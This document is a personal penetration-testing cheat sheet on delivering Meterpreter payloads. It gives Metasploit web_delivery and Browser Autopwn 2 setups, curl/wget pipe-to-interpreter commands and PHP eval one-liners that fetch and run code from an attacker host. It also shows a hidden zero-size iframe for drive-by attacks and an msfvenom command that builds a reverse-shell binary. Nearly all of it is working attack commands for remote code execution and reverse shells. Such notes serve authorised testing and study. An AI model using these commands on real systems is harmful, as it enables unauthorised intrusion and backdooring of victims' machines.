---
title: "Meterpreter Delivery Methods"
date: 2021-10-09T15:14:56-05:00
draft: false
---

# Normal
Via exploit.

# Executing a Command that Downloads and Runs

## References

[Web Delivery module](https://www.rapid7.com/db/modules/exploit/multi/script/web_delivery)

[Example with PHP](https://www.offensive-security.com/metasploit-unleashed/web-delivery/)

## Info
This will stand up a server with a specific URL that will download valid Python/PHP/etc. that will eventually download and execute your payload of choice.  So - you can use the URL to get a copy of valid Python/PHP/etc. code which you could then embed in another program.  Or, you can use curl/language-specific downloader to grab the URL at runtime.

Each of these will provide a command line you can use to run them.  You can also pipe curl output to the interpreter generally.

## Starting Up

    use exploit/multi/script/web_delivery
    set TARGET 1
    set PAYLOAD php/meterpreter/reverse_tcp
    set LHOST 192.168.80.128
    exploit

## Curl and Wget Method

    curl http://.....  | python

    wget -O - http://... | python

Or, if using HTTPS:

    curl -k https://.....  | python

    wget --no-check-certificate -O - http://... | python

## Available Targets

* 0: Python
* 1: PHP
* 2: PSH
* 3: Regsvr32
* 4: Pubprn
* 5: PSH (binary)
* 6: Linux

## Target 0 - Python
These will spawn a background meterpreter.  The command below works, but so does the one the script gives you on startup.

    import urllib;exec(urllib.URLopener().open("http://..."))

## Target 1 - PHP
For target 1 (PHP) the following will execute this on the remote host.  However, it won't execute in the background.

    php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.80.128:8080/alK3t3tt'));"

With HTTPS, on newer php versions, you may need

    php -d allow_url_fopen=true -r "eval(file_get_contents('https://127.0.0.1:8080/2FkAulqJIVBwD', false, stream_context_create(array("ssl"=>array("verify_peer"=>false, "verify_peer_name"=>false)))));"

## Target 3 - Regsvr32
This will give you a command line that uses scrobj.dll to interpret a downloaded scriptlet.  The scriptlet downloads a further powershell-based executable.

## Target 4 - Pubprn
This seems pretty similar to target 3, but uses the pubprn.vbs script to kick off execution.

## Target 5 - PSH (binary)
Downloads and executes a binary via powershell.  Not sure if this saves to disk or not...

## Target 6 - Linux
This downloads a binary to disk and executes it.

# Office Macro
[Offensive Security Post on Building an Infected Macro](https://www.offensive-security.com/metasploit-unleashed/vbscript-infection-methods/)

# Browser Autopwn 2
[Rapid7 Post on Browser Autopwn](https://blog.rapid7.com/2015/07/15/the-new-metasploit-browser-autopwn-strikes-faster-and-smarter-part-1/)

    use auxiliary/server/browser_autopwn2
    set INCLUDE_PATTERN ...
    set HTMLContent "Loading!  Please wait..."
    set MaxExploitCount 30

Potential include patterns - "(windows|firefox)"

Embed with:
    <iframe src="..." height="0px" width="0px"></iframe>

# Existing Meterpreter Session
[Post Exploitation Multi Meterpreter Inject](../meterpreter_post_exploitation#Multi_Meterpreter_Inject)

# Creating Meterpreter Binaries

https://netsec.ws/?p=331 Cheat Sheet

    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=... LPORT=... -f elf -o shell.elf

Using `PrependFork=true` will background it.

